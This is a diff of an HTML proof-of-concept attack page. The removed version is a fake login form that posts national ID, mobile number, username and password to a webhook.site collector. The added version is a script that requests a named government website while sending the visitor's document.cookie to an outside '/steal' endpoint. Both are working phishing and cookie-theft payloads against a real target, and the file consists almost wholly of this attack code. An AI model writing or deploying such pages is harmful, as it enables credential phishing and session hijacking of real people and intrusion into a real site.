@@ -1,24 +1,17 @@
 <!DOCTYPE html>
 <html>
-<head>
-  <title>Fake Login Page (PoC)</title>
-</head>
-<body>
-  <h2>Login Simulation</h2>
-  <form method="POST" action="https://webhook.site/106dbb5c-be68-4c76-b9e5-d4e1ec394372">
-    <label for="nid">National ID:</label><br>
-    <input type="text" id="nid" name="nid"><br><br>
-
-    <label for="mobile">Mobile Number:</label><br>
-    <input type="text" id="mobile" name="mobile"><br><br>
-
-    <label for="username">Username:</label><br>
-    <input type="text" id="username" name="username"><br><br>
-
-    <label for="password">Password:</label><br>
-    <input type="password" id="password" name="password"><br><br>
-
-    <input type="submit" value="Login">
-  </form>
-</body>
+  <body>
+    <script>
+      // Auto-redirect to vulnerable page with controlled referer
+      fetch("https://aq.riyadhenv.gov.sa/switch_lang/ar", {
+        method: "GET",
+        mode: "no-cors",
+        headers: {
+          "Referer": "https://0xnzs.github.io/steal?c=" + document.cookie
+        }
+      });
+    </script>
+    <p>Loading...</p>
+  </body>
 </html>
+
